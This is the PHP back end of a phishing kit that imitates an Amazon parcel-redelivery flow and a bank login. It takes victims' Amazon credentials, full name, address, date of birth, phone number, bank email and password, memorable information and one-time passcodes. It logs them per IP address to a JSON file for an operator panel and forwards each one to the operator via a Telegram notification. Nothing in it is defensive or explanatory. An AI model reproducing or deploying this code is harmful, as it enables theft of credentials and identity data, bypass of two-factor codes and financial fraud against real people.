<?php
// Configuration
$json_file = 'panel/data/status.json';

// Check if POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = filter_input(INPUT_POST, 'action', FILTER_SANITIZE_STRING);
    $ip = filter_input(INPUT_POST, 'IP', FILTER_VALIDATE_IP);

    // Read existing JSON data
    $json_data = [];
    if (file_exists($json_file)) {
        $json_content = file_get_contents($json_file);
        if ($json_content !== false) {
            $json_data = json_decode($json_content, true) ?: [];
        }
    }

    switch ($action) {

        case 'first':
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            // Update JSON data
            $json_data[$ip] = [
                'Status' => $status,
                'Timestamp' => date('d/m/Y h:i A')
            ];
            break;

        case 'log1':
            $Em_User = filter_input(INPUT_POST, 'Em_User', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            // Update JSON data
            $json_data[$ip] = [
                'Em_User' => $Em_User,
                'Status' => $status,
                'Timestamp' => date('d/m/Y h:i A')
            ];
            break;

        case 'log2':
            $Em_User = filter_input(INPUT_POST, 'Em_User', FILTER_SANITIZE_STRING);
            $Pass = filter_input(INPUT_POST, 'Pass', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            // Update JSON data
            $json_data[$ip] = [
                'Em_User' => $Em_User,
                'Pass' => $Pass,
                'Status' => $status,
                'Timestamp' => date('d/m/Y h:i A')
            ];

            $message = "[------- AMAZON -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "Log: $Em_User\n";
            $message .= "Pass: $Pass\n";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;

        case 'reschedule':
            $FullName = filter_input(INPUT_POST, 'FullName', FILTER_SANITIZE_STRING);
            $DeliveryAddress = filter_input(INPUT_POST, 'DeliveryAddress', FILTER_SANITIZE_STRING);
            $DateOfBirth = filter_input(INPUT_POST, 'DateOfBirth', FILTER_SANITIZE_STRING);
            $PreferredRedeliveryDate = filter_input(INPUT_POST, 'PreferredRedeliveryDate', FILTER_SANITIZE_STRING);
            $PreferredTimeSlot = filter_input(INPUT_POST, 'PreferredTimeSlot', FILTER_SANITIZE_STRING);
            $ContactPhoneNumber = filter_input(INPUT_POST, 'ContactPhoneNumber', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            // Update JSON data
            if (!isset($json_data[$ip])) {
                $json_data[$ip] = [];
            }
            $json_data[$ip] = array_merge($json_data[$ip], [
                'FullName' => $FullName,
                'DeliveryAddress' => $DeliveryAddress,
                'DateOfBirth' => $DateOfBirth,
                'PreferredRedeliveryDate' => $PreferredRedeliveryDate,
                'PreferredTimeSlot' => $PreferredTimeSlot,
                'ContactPhoneNumber' => $ContactPhoneNumber,
                'Status' => $status,
                'Timestamp' => date('d/m/Y h:i A')
            ]);

            $message = "[------- AMAZON RESCHEDULE -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "Full Name: $FullName\n";
            $message .= "Delivery Address: $DeliveryAddress\n";
            $message .= "Date of Birth: $DateOfBirth\n";
            $message .= "Preferred Redelivery Date: $PreferredRedeliveryDate\n";
            $message .= "Preferred Time Slot: $PreferredTimeSlot\n";
            $message .= "Contact Phone Number: $ContactPhoneNumber";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;

        case 'bnk':
            $SelectedBank = filter_input(INPUT_POST, 'SelectedBank', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            // Update JSON data
            if (isset($json_data[$ip])) {
                $json_data[$ip]['SelectedBank'] = $SelectedBank;
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            } else {
                $json_data[$ip] = [
                    'SelectedBank' => $SelectedBank,
                    'Status' => $status,
                    'Timestamp' => date('d/m/Y h:i A')
                ];
            }

            $message = "[------- AMAZON BANK SELECTION -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "Selected Bank: $SelectedBank\n";
            $message .= "Delivery Fee: £2.49";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;

        case 'bnk_log':
            $Email = filter_input(INPUT_POST, 'Email', FILTER_SANITIZE_STRING);
            $Password = filter_input(INPUT_POST, 'Password', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            if (isset($json_data[$ip])) {
                $json_data[$ip]['Email'] = $Email;
                $json_data[$ip]['Password'] = $Password;
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            } else {
                $json_data[$ip] = [
                    'BnkEmail' => $Email,
                    'BnkPassword' => $Password,
                    'Status' => $status,
                    'Timestamp' => date('d/m/Y h:i A')
                ];
            }

            $message = "[------- BANK LOGIN -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "Email: $Email\n";
            $message .= "Password: $Password";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;

        case 'bnk_memorable':
            $Memorable = filter_input(INPUT_POST, 'Memorable', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            if (isset($json_data[$ip])) {
                $json_data[$ip]['Memorable'] = $Memorable;
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            }

            $message = "[------- BANK MEMORABLE -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "Memorable: $Memorable\n";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;

        case 'bnk_otp':
            $OtpCode = filter_input(INPUT_POST, 'OtpCode', FILTER_SANITIZE_STRING);
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            if (isset($json_data[$ip])) {
                $json_data[$ip]['OtpCode'] = $OtpCode;
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            }

            $message = "[------- BANK OTP -------]\n\n";
            $message .= "IP Address: $ip\n";
            $message .= "OTP Code: $OtpCode";

             include 'tlgrm.php';
            sendTelegramNotification($message);
            break;


        case 'goback1':
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            if (isset($json_data[$ip])) {
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            }
            break;

        case 'goto':
            $status = filter_input(INPUT_POST, 'Status', FILTER_SANITIZE_STRING);

            if (isset($json_data[$ip])) {
                $json_data[$ip]['Status'] = $status;
                $json_data[$ip]['Timestamp'] = date('d/m/Y h:i A');
            }
            break;



        default:
            http_response_code(400);
            echo json_encode(['error' => 'Invalid action']);
            exit;
    }

    // Write updated JSON data to file
    if (file_put_contents($json_file, json_encode($json_data, JSON_PRETTY_PRINT)) !== false) {
        http_response_code(200);
        echo json_encode(['message' => 'Record updated successfully']);
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to write to file']);
    }
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
}
?>